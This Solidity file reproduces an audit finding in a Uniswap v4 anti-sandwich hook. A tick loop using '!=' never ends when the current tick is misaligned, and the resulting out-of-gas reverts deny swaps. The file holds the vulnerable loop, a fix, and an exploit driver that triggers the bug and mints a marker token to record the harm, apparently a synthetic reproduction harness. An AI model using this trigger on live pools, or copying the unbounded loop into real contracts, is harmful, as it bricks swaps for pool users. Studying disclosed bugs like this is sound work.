// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of OpenZeppelin uniswap-hooks finding
// 62524: "Infinite Loop in Tick Iteration Due to Misaligned Current Tick".
//
// Source: OpenZeppelin/uniswap-hooks @ 3e9fa228ec0f7fe05a95e09e25442466b459a712
//         src/general/AntiSandwichHook.sol  (_beforeSwap tick loop, L96-L105)
//
// AntiSandwichHook._beforeSwap snapshots the pool's per-tick state at the top of
// each block by walking from the last-checkpoint tick to the live `currentTick`
// in fixed `tickSpacing` steps, looping while `tick != currentTick`. When
// `currentTick` is NOT aligned to `tickSpacing` — which happens naturally as the
// price moves the tick to an arbitrary value — the `+= step` walk STEPS OVER
// currentTick and `tick != currentTick` is never false: the loop never
// terminates. It runs until it exhausts all gas (OOG) or overflows int24 —
// either way EVERY swap on the pool reverts. Permanent swap DoS.
//
// FAITHFULNESS (honesty contract): the loop header (the defective control flow)
// is inlined VERBATIM from the audited source and marked with `// @>`. The loop
// BODY's Uniswap-v4 `poolManager.getTickInfo` state reads are irrelevant to loop
// TERMINATION (the finding is a pure control-flow bug), so they are reduced to a
// trivial, side-effectful double (a per-tick storage write + a counter) that
// keeps the loop from being optimized away. No V4 PoolManager is needed to
// reproduce the non-termination. `lastTick` / `currentTick` / `tickSpacing` are
// supplied directly, faithful to the finding's "misalignment arises naturally
// from price movement". The `key.tickSpacing` reference is represented by the
// `tickSpacing` parameter (the pool's configured spacing — the opaque boundary
// we legitimately control).
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Marker/record token. Minting to the SINK records the liveness harm
///      (a pool's swap entrypoint permanently bricked) so it can be measured.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — verbatim tick-iteration loop from
// AntiSandwichHook._beforeSwap (OZ uniswap-hooks @3e9fa228, L96-L105).
// runCheckpoint() isolates the exact top-of-block tick-snapshot walk.
// ─────────────────────────────────────────────────────────────────────────────
contract AntiSandwichHook {
    // Reduced double of `_lastCheckpoint.state.ticks[tick]` — a per-tick record.
    mapping(int24 => uint256) public tickTouched;
    uint256 public iterations;

    /// @param lastTick    the checkpoint tick (`_lastCheckpoint.state.slot0.tick()`)
    /// @param currentTick the live pool tick   (`poolManager.getSlot0(poolId)`)
    /// @param tickSpacing the pool's configured `key.tickSpacing`
    function runCheckpoint(int24 lastTick, int24 currentTick, int24 tickSpacing) external {
        int24 step = currentTick > lastTick ? tickSpacing : -tickSpacing;

        for (int24 tick = lastTick; tick != currentTick; tick += step) { // @> misaligned currentTick is stepped over: `tick != currentTick` never becomes false -> infinite loop -> OOG / int24-overflow revert on every swap
            // liquidity/fee update reduced to a trivial, side-effectful double;
            // the real V4 PoolManager reads are irrelevant to loop termination.
            tickTouched[tick] = uint256(uint24(tick));
            iterations++;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract — OpenZeppelin PR #80 (commit 5e42129): iterate with a strict
// directional `<` bound (splitting on tick direction) so the walk terminates
// even when currentTick is misaligned to tickSpacing.
// ─────────────────────────────────────────────────────────────────────────────
contract AntiSandwichHookFixed {
    mapping(int24 => uint256) public tickTouched;
    uint256 public iterations;

    function runCheckpoint(int24 lastTick, int24 currentTick, int24 tickSpacing) external {
        if (currentTick < lastTick) {
            for (int24 tick = currentTick; tick < lastTick; tick += tickSpacing) {
                tickTouched[tick] = uint256(uint24(tick));
                iterations++;
            }
        } else {
            for (int24 tick = lastTick; tick < currentTick; tick += tickSpacing) {
                tickTouched[tick] = uint256(uint24(tick));
                iterations++;
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: run the REAL buggy tick-snapshot walk with a misaligned
// currentTick under a FULL 30M-gas block budget. It still reverts (OOG), so the
// pool's top-of-block snapshot — and thus every swap — is permanently bricked.
// Negative controls prove the misalignment (not the setup) is the trigger.
// The liveness harm is recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    AntiSandwichHook public vuln;
    AntiSandwichHookFixed public fixedHook;
    MiniToken public marker;

    // Exposed results.
    bool public misalignedReverted;      // buggy path: misaligned tick bricks the checkpoint
    bool public alignedSucceeded;        // same buggy contract: aligned tick terminates
    bool public fixedHandlesMisaligned;  // fixed contract: misaligned tick terminates
    uint256 public sinkMarkerBalance;

    // 5 is NOT a multiple of 10 (misaligned); 20 IS (aligned).
    int24 internal constant LAST_TICK = 0;
    int24 internal constant CUR_TICK_MISALIGNED = 5;
    int24 internal constant CUR_TICK_ALIGNED = 20;
    int24 internal constant TICK_SPACING = 10;
    uint256 internal constant GAS_BUDGET = 30_000_000; // full-block gas budget

    constructor() {
        vuln = new AntiSandwichHook();                          // deploy index 0
        fixedHook = new AntiSandwichHookFixed();                // deploy index 1
        marker = new MiniToken("Locked Pool", "LOCKED-POOL");   // deploy index 2 (LAST)
    }

    function markerAddr() external view returns (address) {
        return address(marker);
    }

    function run() external payable {
        // --- REAL buggy path: misaligned currentTick bricks the top-of-block snapshot ---
        // Forward a FULL block gas budget; the verbatim loop still reverts (OOG).
        (bool okMis,) = address(vuln).call{gas: GAS_BUDGET}(
            abi.encodeWithSelector(AntiSandwichHook.runCheckpoint.selector, LAST_TICK, CUR_TICK_MISALIGNED, TICK_SPACING)
        );
        misalignedReverted = !okMis;
        require(misalignedReverted, "misaligned checkpoint unexpectedly terminated");

        // --- Negative control on the SAME buggy contract: aligned tick terminates ---
        (bool okAligned,) = address(vuln).call{gas: GAS_BUDGET}(
            abi.encodeWithSelector(AntiSandwichHook.runCheckpoint.selector, LAST_TICK, CUR_TICK_ALIGNED, TICK_SPACING)
        );
        alignedSucceeded = okAligned;
        require(alignedSucceeded, "aligned checkpoint should terminate");

        // --- Negative control on the FIXED contract: misaligned tick now terminates ---
        (bool okFixed,) = address(fixedHook).call{gas: GAS_BUDGET}(
            abi.encodeWithSelector(AntiSandwichHookFixed.runCheckpoint.selector, LAST_TICK, CUR_TICK_MISALIGNED, TICK_SPACING)
        );
        fixedHandlesMisaligned = okFixed;
        require(fixedHandlesMisaligned, "fix should terminate on misaligned tick");

        // --- Record the liveness harm: this pool's swaps are permanently bricked ---
        // Pure DoS (no fund quantity): mint 1 marker unit to the SINK, meaning
        // "1 pool's swap entrypoint permanently reverts".
        marker.mint(SINK, 1);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
